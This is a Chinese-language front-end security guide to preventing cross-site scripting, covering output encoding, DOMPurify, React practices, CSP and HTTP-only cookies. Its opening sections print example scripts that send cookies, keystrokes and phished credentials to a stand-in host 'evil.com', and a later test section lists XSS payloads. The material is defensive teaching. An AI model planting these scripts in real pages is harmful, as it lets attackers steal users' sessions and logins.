# XSS 跨站脚本攻击防护 - 前端安全实战指南

## 1. XSS 攻击概述

### 1.1 什么是 XSS

XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击，攻击者通过在网页中注入恶意脚本，当其他用户浏览该网页时,恶意脚本会在用户浏览器中执行,从而窃取用户信息、劫持用户会话或进行其他恶意操作。

**核心危害：**

- **窃取 Cookie**：获取用户会话令牌
- **键盘记录**：记录用户输入的敏感信息
- **钓鱼攻击**：伪造登录表单窃取凭据
- **网页篡改**：修改页面内容
- **恶意重定向**：将用户导向钓鱼网站
- **传播蠕虫**：在社交网络中传播

### 1.2 XSS 攻击类型

#### 存储型 XSS（Stored XSS）

```javascript
// 最危险的类型,恶意脚本存储在服务器上

// 攻击场景：用户评论、论坛帖子、个人资料
const maliciousComment = `
  <script>
    // 窃取 Cookie
    document.location='http://evil.com/steal?cookie='+document.cookie;
  </script>
`;

// 当其他用户查看评论时,脚本自动执行
```

#### 反射型 XSS（Reflected XSS）

```javascript
// 通过 URL 参数注入脚本

// 攻击 URL
https://example.com/search?q=<script>alert(document.cookie)</script>

// 服务器直接将参数输出到页面
<h1>搜索结果: <script>alert(document.cookie)</script></h1>
```

#### DOM 型 XSS（DOM-based XSS）

```javascript
// 完全在客户端发生,不经过服务器

// 易受攻击的代码
const search = location.search.substring(1);
document.getElementById('result').innerHTML = search;

// 攻击 URL
https://example.com/#<img src=x onerror=alert(document.cookie)>
```

### 1.3 XSS 攻击示例

#### 窃取 Cookie

```html
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      url: location.href,
      userAgent: navigator.userAgent
    })
  });
</script>
```

#### 键盘记录

```html
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://evil.com/keylog', {
      method: 'POST',
      body: JSON.stringify({
        key: e.key,
        target: e.target.id,
        timestamp: Date.now()
      })
    });
  });
</script>
```

#### 钓鱼表单

```html
<div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999;">
  <h1>会话已过期,请重新登录</h1>
  <form id="phishing-form">
    <input type="text" id="username" placeholder="用户名">
    <input type="password" id="password" placeholder="密码">
    <button onclick="stealCredentials()">登录</button>
  </form>
</div>

<script>
  function stealCredentials() {
    const data = {
      username: document.getElementById('username').value,
      password: document.getElementById('password').value
    };
    fetch('https://evil.com/phishing', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
</script>
```

## 2. XSS 防护策略

### 2.1 输入验证

#### 白名单验证

```typescript
// 只允许特定字符
function sanitizeInput(input: string): string {
  // 只允许字母、数字、空格和基本标点
  return input.replace(/[^a-zA-Z0-9\s\.,!?-]/g, '');
}

// 验证邮箱
function validateEmail(email: string): boolean {
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  return emailRegex.test(email);
}

// 验证 URL
function validateURL(url: string): boolean {
  try {
    const parsed = new URL(url);
    // 只允许 http 和 https 协议
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}
```

#### 黑名单过滤（不推荐）

```typescript
// 黑名单容易被绕过,不建议单独使用
function blacklistFilter(input: string): string {
  return input
    .replace(/<script[^>]*>.*?<\/script>/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/on\w+\s*=/gi, '');
}

// 问题：可以被绕过
// <ScRiPt>alert(1)</ScRiPt>
// <img src=x onerror=alert(1)>
// <svg/onload=alert(1)>
```

### 2.2 输出编码

#### HTML 实体编码

```typescript
// 将特殊字符转换为 HTML 实体
function escapeHtml(unsafe: string): string {
  const htmlEntities: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  
  return unsafe.replace(/[&<>"'\/]/g, (char) => htmlEntities[char]);
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
const safe = escapeHtml(userInput);
// 结果: &lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;

document.getElementById('output').textContent = safe;
```

#### JavaScript 编码

```typescript
// 编码用于 JavaScript 上下文的数据
function escapeJavaScript(unsafe: string): string {
  return unsafe
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/\//g, '\\/');
}

// 使用示例
const data = escapeJavaScript(userInput);
const script = `var message = '${data}';`;
```

#### URL 编码

```typescript
// 编码 URL 参数
function encodeURLParameter(param: string): string {
  return encodeURIComponent(param);
}

// 使用示例
const searchTerm = 'hello <script>alert(1)</script>';
const safeURL = `/search?q=${encodeURLParameter(searchTerm)}`;
```

#### CSS 编码

```typescript
// 编码用于 CSS 的数据
function escapeCSS(unsafe: string): string {
  return unsafe.replace(/[^a-zA-Z0-9]/g, (char) => {
    return '\\' + char.charCodeAt(0).toString(16) + ' ';
  });
}
```

### 2.3 React 中的 XSS 防护

#### 使用 JSX 自动转义

```tsx
// React 会自动转义文本内容
function SafeComponent({ userInput }: { userInput: string }) {
  // 安全：React 自动转义
  return <div>{userInput}</div>;
}

// 使用示例
<SafeComponent userInput="<script>alert('XSS')</script>" />
// 渲染结果: &lt;script&gt;alert('XSS')&lt;/script&gt;
```

#### 避免 dangerouslySetInnerHTML

```tsx
// ❌ 危险：直接设置 HTML
function UnsafeComponent({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ 安全：使用消毒库
import DOMPurify from 'dompurify';

function SafeComponent({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

#### 安全的属性绑定

```tsx
// ❌ 危险：动态绑定事件处理器
function UnsafeButton({ onClick }: { onClick: string }) {
  return <button onClick={eval(onClick)}>Click</button>;
}

// ✅ 安全：使用函数引用
function SafeButton({ onClick }: { onClick: () => void }) {
  return <button onClick={onClick}>Click</button>;
}

// ❌ 危险：动态 href
function UnsafeLink({ url }: { url: string }) {
  return <a href={url}>Link</a>;
}

// ✅ 安全：验证 URL
function SafeLink({ url }: { url: string }) {
  const isValid = /^https?:\/\//.test(url);
  return isValid ? <a href={url}>Link</a> : <span>Invalid URL</span>;
}
```

### 2.4 使用 DOMPurify

```typescript
import DOMPurify from 'dompurify';

// 基本使用
const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
// 结果: <img src="x">

// 自定义配置
const config = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false,
  FORBID_TAGS: ['style', 'script'],
  FORBID_ATTR: ['onclick', 'onerror', 'onload']
};

const sanitized = DOMPurify.sanitize(dirty, config);

// React 组件中使用
function SafeHTMLRenderer({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href', 'target']
  });
  
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

## 3. 内容安全策略（CSP）

### 3.1 CSP 基础

```html
<!-- 通过 meta 标签设置 CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted.cdn.com">
```

```javascript
// 通过 HTTP 响应头设置 CSP（推荐）
// server.js (Express)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' https://trusted.cdn.com; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self' https://api.example.com; " +
    "frame-ancestors 'none';"
  );
  next();
});
```

### 3.2 CSP 指令详解

```javascript
// CSP 完整配置示例
const cspDirectives = {
  // 默认策略
  "default-src": ["'self'"],
  
  // 脚本源
  "script-src": [
    "'self'",
    "https://trusted.cdn.com",
    "'nonce-{RANDOM}'",  // 使用 nonce
    "'sha256-{HASH}'"    // 使用哈希
  ],
  
  // 样式源
  "style-src": [
    "'self'",
    "'unsafe-inline'",   // 允许内联样式（不推荐）
    "https://fonts.googleapis.com"
  ],
  
  // 图片源
  "img-src": [
    "'self'",
    "data:",             // 允许 data: URL
    "https:",            // 允许所有 HTTPS 图片
    "blob:"              // 允许 blob: URL
  ],
  
  // 字体源
  "font-src": [
    "'self'",
    "https://fonts.gstatic.com"
  ],
  
  // 连接源（fetch, XHR, WebSocket）
  "connect-src": [
    "'self'",
    "https://api.example.com",
    "wss://websocket.example.com"
  ],
  
  // 媒体源
  "media-src": ["'self'", "https://media.example.com"],
  
  // 对象源（<object>, <embed>, <applet>）
  "object-src": ["'none'"],
  
  // Frame 源
  "frame-src": ["'none'"],
  
  // Worker 源
  "worker-src": ["'self'"],
  
  // Form 提交目标
  "form-action": ["'self'"],
  
  // Frame 祖先（防止点击劫持）
  "frame-ancestors": ["'none'"],
  
  // 基础 URI
  "base-uri": ["'self'"],
  
  // 升级不安全请求
  "upgrade-insecure-requests": [],
  
  // 阻止混合内容
  "block-all-mixed-content": []
};

// 生成 CSP 字符串
const cspString = Object.entries(cspDirectives)
  .map(([directive, sources]) => 
    `${directive} ${sources.join(' ')}`
  )
  .join('; ');
```

### 3.3 使用 Nonce

```typescript
// server.ts
import crypto from 'crypto';
import express from 'express';

const app = express();

app.use((req, res, next) => {
  // 为每个请求生成唯一的 nonce
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}'; ` +
    `style-src 'self' 'nonce-${nonce}';`
  );
  
  next();
});

// 在 HTML 中使用 nonce
app.get('/', (req, res) => {
  const nonce = res.locals.nonce;
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <script nonce="${nonce}">
          console.log('This script is allowed');
        </script>
        <style nonce="${nonce}">
          body { background: white; }
        </style>
      </head>
      <body>
        <h1>CSP with Nonce</h1>
      </body>
    </html>
  `);
});
```

### 3.4 CSP 报告

```javascript
// 配置 CSP 报告
const csp = [
  "default-src 'self'",
  "script-src 'self' https://trusted.cdn.com",
  "report-uri /csp-report",  // 旧版
  "report-to csp-endpoint"   // 新版
].join('; ');

// 设置 Report-To header
res.setHeader('Report-To', JSON.stringify({
  group: 'csp-endpoint',
  max_age: 10886400,
  endpoints: [{
    url: 'https://example.com/csp-report'
  }]
}));

// 接收 CSP 报告
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body;
  console.log('CSP Violation:', JSON.stringify(report, null, 2));
  
  // 存储报告到数据库或日志系统
  saveCSPReport(report);
  
  res.status(204).send();
});
```

## 4. HTTP-only Cookie

### 4.1 设置 HTTP-only Cookie

```javascript
// Express 设置 HTTP-only Cookie
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // 验证用户
  const user = await authenticateUser(username, password);
  
  if (user) {
    // 设置 HTTP-only Cookie
    res.cookie('sessionId', user.sessionId, {
      httpOnly: true,      // 防止 JavaScript 访问
      secure: true,        // 只在 HTTPS 下发送
      sameSite: 'strict',  // CSRF 保护
      maxAge: 3600000      // 1小时
    });
    
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

### 4.2 Token 存储最佳实践

```typescript
// ❌ 不安全：存储在 localStorage
localStorage.setItem('token', token);

// ❌ 不安全：存储在普通 Cookie
document.cookie = `token=${token}`;

// ✅ 安全：使用 HTTP-only Cookie（服务器设置）
// 客户端无法访问，自动随请求发送

// ✅ 安全：存储在内存中（单页应用）
class AuthService {
  private token: string | null = null;
  
  setToken(token: string) {
    this.token = token;
  }
  
  getToken(): string | null {
    return this.token;
  }
  
  clearToken() {
    this.token = null;
  }
}
```

## 5. 实战防护方案

### 5.1 用户输入处理

```typescript
// 综合输入处理函数
class InputSanitizer {
  // 清理用户名
  static sanitizeUsername(input: string): string {
    return input
      .trim()
      .replace(/[^a-zA-Z0-9_-]/g, '')
      .substring(0, 30);
  }
  
  // 清理邮箱
  static sanitizeEmail(input: string): string {
    const cleaned = input.trim().toLowerCase();
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(cleaned) ? cleaned : '';
  }
  
  // 清理文本内容
  static sanitizeText(input: string): string {
    return escapeHtml(input.trim());
  }
  
  // 清理 HTML 内容
  static sanitizeHTML(input: string): string {
    return DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a'],
      ALLOWED_ATTR: ['href', 'target'],
      ALLOW_DATA_ATTR: false
    });
  }
  
  // 清理 URL
  static sanitizeURL(input: string): string {
    try {
      const url = new URL(input);
      if (['http:', 'https:'].includes(url.protocol)) {
        return url.href;
      }
    } catch {
      return '';
    }
    return '';
  }
}
```

### 5.2 表单提交防护

```tsx
import { useState } from 'react';
import DOMPurify from 'dompurify';

interface CommentFormProps {
  onSubmit: (comment: string) => Promise<void>;
}

function CommentForm({ onSubmit }: CommentFormProps) {
  const [comment, setComment] = useState('');
  const [error, setError] = useState('');
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    
    // 前端验证
    if (comment.trim().length < 3) {
      setError('评论至少需要 3 个字符');
      return;
    }
    
    if (comment.length > 500) {
      setError('评论不能超过 500 个字符');
      return;
    }
    
    // 清理输入
    const sanitized = DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: [],
      ALLOWED_ATTR: []
    });
    
    try {
      await onSubmit(sanitized);
      setComment('');
    } catch (err) {
      setError('提交失败，请重试');
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment}
        onChange={(e) => setComment(e.target.value)}
        maxLength={500}
        placeholder="输入评论..."
      />
      {error && <div className="error">{error}</div>}
      <button type="submit">提交</button>
    </form>
  );
}
```

### 5.3 富文本编辑器防护

```tsx
import { useState } from 'react';
import DOMPurify from 'dompurify';
import ReactQuill from 'react-quill';

function RichTextEditor() {
  const [content, setContent] = useState('');
  
  // 配置允许的标签和属性
  const sanitizeConfig = {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u', 's',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'blockquote', 'pre', 'code',
      'ul', 'ol', 'li',
      'a', 'img'
    ],
    ALLOWED_ATTR: [
      'href', 'target', 'rel',
      'src', 'alt', 'width', 'height'
    ],
    ALLOW_DATA_ATTR: false
  };
  
  const handleChange = (value: string) => {
    // 实时清理内容
    const sanitized = DOMPurify.sanitize(value, sanitizeConfig);
    setContent(sanitized);
  };
  
  const handleSubmit = async () => {
    // 提交前再次清理
    const finalContent = DOMPurify.sanitize(content, sanitizeConfig);
    
    await fetch('/api/posts', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: finalContent })
    });
  };
  
  return (
    <div>
      <ReactQuill
        value={content}
        onChange={handleChange}
        modules={{
          toolbar: [
            ['bold', 'italic', 'underline'],
            ['link', 'image'],
            [{ list: 'ordered' }, { list: 'bullet' }]
          ]
        }}
      />
      <button onClick={handleSubmit}>发布</button>
    </div>
  );
}
```

## 6. 服务器端防护

### 6.1 输入验证

```typescript
// Express 中间件
import { body, validationResult } from 'express-validator';
import DOMPurify from 'isomorphic-dompurify';

// 验证规则
const commentValidation = [
  body('content')
    .trim()
    .isLength({ min: 3, max: 500 })
    .withMessage('评论长度必须在 3-500 个字符之间')
    .customSanitizer((value) => {
      return DOMPurify.sanitize(value, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: []
      });
    })
];

// 路由处理
app.post('/api/comments', commentValidation, async (req, res) => {
  const errors = validationResult(req);
  
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  
  const { content } = req.body;
  
  // 存储到数据库
  await saveComment(content);
  
  res.json({ success: true });
});
```

### 6.2 输出编码

```typescript
// 模板引擎自动转义
// EJS
app.set('view engine', 'ejs');

// template.ejs
<div><%= userInput %></div>  <!-- 自动转义 -->
<div><%- userInput %></div>  <!-- 不转义（危险） -->

// Handlebars
import Handlebars from 'handlebars';

const template = Handlebars.compile('<div>{{userInput}}</div>');
const html = template({ userInput: '<script>alert(1)</script>' });
// 结果: <div>&lt;script&gt;alert(1)&lt;/script&gt;</div>

// 手动转义
function renderTemplate(data: any): string {
  return `
    <div class="comment">
      <p>${escapeHtml(data.content)}</p>
      <span>by ${escapeHtml(data.author)}</span>
    </div>
  `;
}
```

## 7. 测试与审计

### 7.1 XSS 测试用例

```typescript
// 测试输入列表
const xssTestCases = [
  // 基本脚本注入
  '<script>alert(1)</script>',
  '<ScRiPt>alert(1)</ScRiPt>',
  
  // 事件处理器
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  
  // JavaScript 协议
  '<a href="javascript:alert(1)">Click</a>',
  '<iframe src="javascript:alert(1)">',
  
  // HTML 编码绕过
  '<img src=x on&#101;rror=alert(1)>',
  '<script>alert(String.fromCharCode(88,83,83))</script>',
  
  // CSS 注入
  '<style>body{background:url("javascript:alert(1)")}</style>',
  '<div style="background:url(javascript:alert(1))">',
  
  // DOM 破坏
  '<img src="x` `<script>alert(1)</script>">',
  '<img src onerror=alert(1) src=x>',
  
  // 多行脚本
  '<script>\nalert(1)\n</script>',
  
  // Unicode 编码
  '<script>\u0061lert(1)</script>',
  
  // 注释注入
  '<!--><script>alert(1)</script>-->',
  
  // SVG 注入
  '<svg><script>alert(1)</script></svg>',
  
  // Data URL
  '<object data="data:text/html,<script>alert(1)</script>">',
  
  // Base64 编码
  '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
];

// 自动化测试
describe('XSS Protection', () => {
  xssTestCases.forEach((payload, index) => {
    it(`should sanitize XSS payload #${index + 1}`, () => {
      const sanitized = DOMPurify.sanitize(payload);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('javascript:');
    });
  });
});
```

### 7.2 安全审计清单

**输入验证：**
- [ ] 所有用户输入都经过验证
- [ ] 使用白名单而非黑名单
- [ ] 验证数据类型和格式
- [ ] 限制输入长度

**输出编码：**
- [ ] HTML 上下文使用 HTML 编码
- [ ] JavaScript 上下文使用 JavaScript 编码
- [ ] URL 参数使用 URL 编码
- [ ] CSS 上下文使用 CSS 编码

**CSP 配置：**
- [ ] 启用严格的 CSP 策略
- [ ] 禁止内联脚本和样式
- [ ] 使用 nonce 或哈希
- [ ] 配置 CSP 报告

**Cookie 安全：**
- [ ] 敏感信息使用 HTTP-only Cookie
- [ ] 启用 Secure 标志
- [ ] 配置 SameSite 属性

**框架安全：**
- [ ] 避免 dangerouslySetInnerHTML
- [ ] 使用 DOMPurify 清理 HTML
- [ ] 验证所有动态属性

## 8. 最佳实践总结

### 8.1 防护原则

1. **深度防御**：多层防护，不依赖单一措施
2. **最小权限**：只给予必要的权限
3. **默认安全**：默认拒绝，显式允许
4. **持续更新**：及时更新依赖和安全补丁

### 8.2 开发规范

```typescript
// ✅ 推荐做法
const goodPractices = {
  // 1. 始终验证和清理输入
  input: InputSanitizer.sanitizeText(userInput),
  
  // 2. 使用安全的 API
  element: document.createTextNode(userInput),
  
  // 3. 正确设置 CSP
  csp: "default-src 'self'; script-src 'self'",
  
  // 4. 使用 HTTP-only Cookie
  cookie: { httpOnly: true, secure: true, sameSite: 'strict' },
  
  // 5. 定期安全审计
  audit: 'npm audit',
};

// ❌ 避免做法
const badPractices = {
  // 1. 直接使用用户输入
  innerHTML: element.innerHTML = userInput,
  
  // 2. 使用 eval
  eval: eval(userInput),
  
  // 3. 动态执行代码
  func: new Function(userInput),
  
  // 4. 信任用户输入
  href: `<a href="${userInput}">Link</a>`,
};
```

### 8.3 响应措施

当发现 XSS 漏洞时：

1. **立即修复**：优先处理安全问题
2. **评估影响**：确定受影响的用户和数据
3. **通知用户**：透明沟通安全事件
4. **撤销会话**：使受影响的会话失效
5. **审计日志**：分析攻击模式
6. **加强防护**：改进安全措施

## 9. 工具和资源

### 9.1 安全工具

```bash
# DOMPurify - HTML 清理
npm install dompurify

# express-validator - 服务器端验证
npm install express-validator

# helmet - 安全 HTTP 头
npm install helmet

# csrf - CSRF 保护
npm install csurf
```

### 9.2 在线工具

- **XSS 测试平台**：https://xss-game.appspot.com
- **CSP 评估器**：https://csp-evaluator.withgoogle.com
- **安全头检查**：https://securityheaders.com

## 10. 总结

XSS 防护的关键要点：

1. **输入验证**：验证所有用户输入
2. **输出编码**：正确编码所有输出
3. **CSP 策略**：实施严格的内容安全策略
4. **安全配置**：使用 HTTP-only Cookie 和安全头
5. **持续审计**：定期进行安全测试和审计

通过综合应用这些防护措施，可以有效防止 XSS 攻击，保护用户数据安全。

